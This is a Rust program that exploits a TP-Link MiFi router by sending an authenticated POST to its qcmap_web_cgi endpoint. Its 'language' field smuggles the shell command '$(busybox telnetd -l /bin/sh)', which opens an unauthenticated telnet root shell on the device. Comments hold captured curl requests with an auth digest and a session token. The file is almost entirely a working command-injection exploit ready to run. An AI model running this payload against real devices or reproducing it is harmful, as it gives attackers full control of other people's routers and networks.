use std::{collections::HashMap, ops::Add};
use clap::Parser;
use reqwest;
use reqwest::header::*;
use reqwest::header::{HeaderName,HeaderValue};
use serde::{Deserialize, Serialize};
use serde_json::Result;


#[derive(Parser, Debug)]
#[command(author, version, about, long_about = None)]
struct Args {
    /// Filename
    #[arg(required = true)]
    token: String,
}

/*
	curl 'http://tplinkmifi.net/cgi-bin/qcmap_auth' 
	-X POST 
	-H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0' 
	-H 'Accept: application/json, text/javascript, *SLASH*; q=0.01' 
	-H 'Accept-Language: de,en-US;q=0.7,en;q=0.3' 
	-H 'Accept-Encoding: gzip, deflate' 
	-H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' 
	-H 'X-Requested-With: XMLHttpRequest' 
	-H 'Origin: http://tplinkmifi.net' 
	-H 'Connection: keep-alive' 
	-H 'Referer: http://tplinkmifi.net/login.html' 
	-H 'Pragma: no-cache' 
	-H 'Cache-Control: no-cache' 
	--data-raw '{"module":"authenticator","action":1,"digest":"0d8777ad7c35bbb0aa9a795e70e408f6"}'*/

#[derive(Serialize, Deserialize)]
struct Auth {
	module: String,
	action: u8,
	digest: String
}

/*
{"token":"Ваше значение token","module":"webServer","action":1,"language":"$(busybox telnetd -l /bin/sh)"}
*/
#[derive(Serialize, Deserialize)]
struct Payload {
	token: String,
	module: String,
	action: u8,
	language: String
}


#[tokio::main]
async fn main()  {

	let args = Args::parse();
	let token = args.token;

	let telnet = "bla".to_string();
	let english = "english".to_string();

	/*
	curl 'http://192.168.0.1/cgi-bin/qcmap_web_cgi' 
		-X POST 
		-H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0' 
		-H 'Accept: application/json, text/javascript, *SLASH*; q=0.01' 
		-H 'Accept-Language: de,en-US;q=0.7,en;q=0.3' 
		-H 'Accept-Encoding: gzip, deflate' 
		-H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' 
		-H 'X-Requested-With: XMLHttpRequest' 
		-H 'Origin: http://192.168.0.1' 
		-H 'Connection: keep-alive' 
		-H 'Referer: http://192.168.0.1/settings.html' 
		-H 'Cookie: tpweb_token=xZorYxwA357MLtbd' 
		-H 'Pragma: no-cache' 
		-H 'Cache-Control: no-cache' 
		--data-raw '{"token":"xZorYxwA357MLtbd","module":"storageShare","action":1,"mode":0,"login":0,"rwPermission":1}'
	 */

	let local_token = String::from(&token);

	let mut cookie = "tpweb_token=".to_string();
	let cookie = cookie.add(&local_token);

	let mut headers = HeaderMap::new();
	headers.append(
		USER_AGENT,
		"Mozilla/5.0 (X11; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0".parse().unwrap()
	);
	headers.insert(
		ACCEPT,
		"application/json, text/javascript, *SLASH*; q=0.01".parse().unwrap()
	);
	headers.insert(
		ACCEPT_LANGUAGE,
		"de,en-US;q=0.7,en;q=0.3".parse().unwrap()
	);
	headers.insert(
		ACCEPT_ENCODING,
		"gzip, deflate".parse().unwrap()
	);
	headers.insert(
		CONTENT_TYPE,
		"application/x-www-form-urlencoded; charset=UTF-8".parse().unwrap()
	);
	headers.insert(
		HeaderName::from_lowercase(b"x-requested-with").unwrap(),
		"XMLHttpRequest".parse().unwrap()
	);
	headers.insert(
		ORIGIN,
		"http://192.168.0.1".parse().unwrap()
	);
	headers.insert(
		CONNECTION,
		"keep-alive".parse().unwrap()
	);
	headers.insert(
		REFERER,
		"http://192.168.0.1/settings.html".parse().unwrap()
	);
	headers.insert(
		COOKIE,
		HeaderValue::from_str(&cookie).unwrap()
	);
	headers.insert(
		PRAGMA,
		"no-cache".parse().unwrap()
	);
	headers.insert(
		CACHE_CONTROL,
		"no-cache".parse().unwrap()
	);

	/*{"token":"Ваше значение token","module":"webServer","action":1,"language":"$(busybox telnetd -l /bin/sh)"}*/

	let payload = Payload {
		token: String::from(&token),
		module: "webserver".to_string(),
		action: 1,
		language: "$(busybox telnetd -l /bin/sh)".to_string()
	};

	let payload_restore_language = Payload {
		token: String::from(&token),
		module: "webserver".to_string(),
		action: 1,
		language: "en".to_string()
	};

	println!("{token:#?}");

	let client = reqwest::Client::new();

	let resp = client.post("http://192.168.0.1/cgi-bin/qcmap_web_cgi")
		.json(&payload)
		.headers(headers)
		.send()
		.await;

    println!("{resp:#?}");

}

